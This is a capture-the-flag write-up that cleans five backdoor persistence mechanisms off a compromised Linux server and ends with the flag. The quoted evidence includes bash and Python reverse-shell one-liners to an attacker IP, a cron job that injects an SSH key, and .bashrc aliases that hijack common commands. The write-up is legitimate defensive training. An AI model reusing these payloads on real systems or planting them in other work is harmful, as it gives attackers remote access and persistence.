# Infection 
*Disclaimer:* I really liked the challenge and had so much fun solving/demonstrating it. Enjoy reading it and feel free to let me know how I can do in a more suitable way.
## *Challenge Description:*
Our production server got hacked. As a soc analyst you are tasked with cleaning the server. Deleting and moving around files at random is not the right solution. You can validate the challenge as root, with /root/validate.
## *Solution:*
- At the first glance, I was about to start with the OS level using osquery. Thankfully I changed my mind because at the end I knew It wouldn't be effective.
- Running `sudo /root/validate' Outputs the score in a scale of 5. So, We were asked to find the 5 techniques were used for achieving persistence.

1. #### Mistakes:
    The next steps are the most important. It wasn't as simple as it looked (It took me 3h30). I've wasted so much time:  
    - Checking the logs in `/var/log`
    - Looking for any server files (Misleaded by the description).
    - Checking readable/writteable by `ctf` user files one-by-one. (example in step 7)
    - Looking for scripts and executables.
    - Deleting suspicious files without checking their content (example in step 3)
    - Not thinking about all possibilities. (example in step 4)
    - Cleaning manually instead of using default settings files, backups ...
    - Reverting so many times.
2. I uploaded [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for a simple fast scan.
The most interesting lines were: 
```Bash
...
╔══════════╣ Cron jobs
* * * * * nohup bash -c 'bash -i >& /dev/tcp/10.10.2.99/1337 0>&1' >/dev/null 2>&1 &
* * * * * echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDniDrOOLI8g9Gopo0TyAKcC9v4CL3I6Ly5lJGtj9MgpCh9Dmv5I1+63/FMH0fFFxSxG6j8aQft53771xsIrvykOKaPnKAdcNKmpxucDQ8CLSp9/brTmduzb3WsCyluyEOf8D0I8FHE2IUJ6AjyhDrnRclnJ4+54AWlE2mpsEszmV0ZXrK1ewHR0Zz5bGA7sqe9aM6Lds04F/AFs1Hb9PNwkv/2YlM3GixPBg3JaXuJYjI1oI4Atxw7ivrmqKNiUvHmKKiuTyhsSTU/Y7UgkNcx9h7mGiitXQsQn8+KJRSkihW2jf1pcncy2BULcyz57VutV99ESDyKTMAfMuiVBKgeoHRkUwWLcGR5cP2tUpIofPTT8CoSim83mTnYEDCtGkvdii6kCvxPevedUa0dTRPuN0ZWxbWIFBYpxBRdmszdpyA5qgKwBXSCWcGAdZL4WMf9f9Ilc0/6Eys9ULpXiryEY4qhPBa3mtOKnCPoCxxdgQAyHFj+4R5A8/vzUrYxoWM= chahine@deathstar' >> /home/ctf/.ssh/authorized_keys
...
╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-rw-r-- 1 ctf root 3786 Feb 16 01:55 /home/ctf/.backdo0r/.bashrc
-rw-rw-r-- 1 ctf root 4820 Feb 16 02:57 /home/ctf/.bashrc
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 ctf ctf 807 Feb 25  2020 /home/ctf/.profile
...
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/tmp/index.html
/home/ctf/.ssh/authorized_keys
...
╔══════════╣ Files inside /home/ctf (limit 20)
total 56
drwxr-xr-x 1 ctf  ctf  4096 Feb 19 14:24 .
drwxr-xr-x 1 root root 4096 Feb 16 12:24 ..
drwxr-xr-x 1 ctf  root 4096 Feb 16 12:24 .backdo0r
-rw-rw-r-- 1 ctf  root  446 Feb 16 01:55 .bash_logout
-rw-rw-r-- 1 ctf  root 4820 Feb 16 02:57 .bashrc
drwx------ 2 ctf  ctf  4096 Feb 19 14:24 .cache
-rw-rw-r-- 1 ctf  ctf  1774 Feb 19 14:24 .inputrc
-rw-r--r-- 1 ctf  ctf   807 Feb 25  2020 .profile
drwxr-xr-x 1 ctf  root 4096 Feb 16 12:24 .ssh
-rw-rw-r-- 1 ctf  ctf   165 Feb 19 14:25 .wget-hsts
```
Conclusion: It's a backdoor cleaning.

2. I deleted `/home/ctf/.backdo0r`. Then I delayed this step to after step 4, because I discoverd if I try to list the `~` directory I got: 
```
ctf@hostname:~$ ls
-bash: /home/ctf/.backdo0r/ls.py: No such file or directory
```
3. I thought there was a `$PATH` misconfiguration, but checking `.bashrc` proved me wrong:
```bash
...
alias cat=/home/ctf/.backdo0r/cat.py
alias find=/home/ctf/.backdo0r/find.py
alias ls=/home/ctf/.backdo0r/ls.py
set -f
alias which=/home/ctf/.backdo0r/which.py
cat /etc/inputrc  > ~/.inputrc
echo "set disable-completion on" >> ~/.inputrc
crontab -l|sed "\$a* * * * * nohup bash -c 'bash -i >& /dev/tcp/10.10.2.99/1337 0>&1' >/dev/null 2>&1 &"|crontab -
crontab -l|sed "\$a* * * * * echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDniDrOOLI8g9Gopo0TyAKcC9v4CL3I6Ly5lJGtj9MgpCh9Dmv5I1+63/FMH0fFFxSxG6j8aQft53771xsIrvykOKaPnKAdcNKmpxucDQ8CLSp9/brTmduzb3WsCyluyEOf8D0I8FHE2IUJ6AjyhDrnRclnJ4+54AWlE2mpsEszmV0ZXrK1ewHR0Zz5bGA7sqe9aM6Lds04F/AFs1Hb9PNwkv/2YlM3GixPBg3JaXuJYjI1oI4Atxw7ivrmqKNiUvHmKKiuTyhsSTU/Y7UgkNcx9h7mGiitXQsQn8+KJRSkihW2jf1pcncy2BULcyz57VutV99ESDyKTMAfMuiVBKgeoHRkUwWLcGR5cP2tUpIofPTT8CoSim83mTnYEDCtGkvdii6kCvxPevedUa0dTRPuN0ZWxbWIFBYpxBRdmszdpyA5qgKwBXSCWcGAdZL4WMf9f9Ilc0/6Eys9ULpXiryEY4qhPBa3mtOKnCPoCxxdgQAyHFj+4R5A8/vzUrYxoWM= chahine@deathstar' >> /home/ctf/.ssh/authorized_keys"|crontab -
alias sh=bash
...
alias unalias=""
alias alias=""
```
I've removed the cat alias manually, then proceeded with:
```
ctf@hostname:~$ cat /etc/bash.bashrc > .bashrc
ctf@hostname:~$ source .bashrc
```

Score: 2/5

4. I deleted `~/.ssh/authorized_keys`

Score: 3/5

5. I deleted the cron job:
```Bash
ctf@hostname:~$ crontab -r
ctf@hostname:~$ crontab -l
no crontab for ctf
```

Score: 4/5

6. I deleted the reverse shell located in `.bash_logout`
```Bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.2.99",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Score: 5/5

## *Flag:*
shellmates{C4lL_m3_B4Ckd00r_C!e4n3rrrrr}